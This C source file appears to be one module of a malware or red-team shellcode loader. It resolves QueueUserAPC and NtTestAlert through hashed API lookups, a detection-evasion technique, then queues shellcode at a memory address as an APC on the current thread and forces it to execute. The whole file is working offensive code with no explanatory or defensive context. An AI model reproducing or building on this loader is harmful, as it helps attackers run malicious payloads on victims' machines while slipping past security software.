#include "../../../includes/memory/memory.h"
#include "../../../includes/apis/apis.h"
#include "../../../includes/core/core.h"



BOOL execution_load_apis() {
	g_ldr->apis->QueueUserAPC = (pQueueUserAPC)GetProc(g_ldr->apis->modules.kernel32, HASHED_QUEUEUSERAPC);
	g_ldr->apis->NtTestAlert = (pNtTestAlert)GetProc(g_ldr->apis->modules.ntdll, HASHED_NTTESTALERT);
	return TRUE;
}


BOOL execution_run(MemoryInfo memInfo) {
	HANDLE hThread = GetCurrentThread();

	if (!g_ldr->apis->QueueUserAPC((PAPCFUNC)memInfo.ShellCodeAddress, hThread, NULL)) {
		return FALSE;
	}

	g_ldr->apis->NtTestAlert();

	return TRUE;
}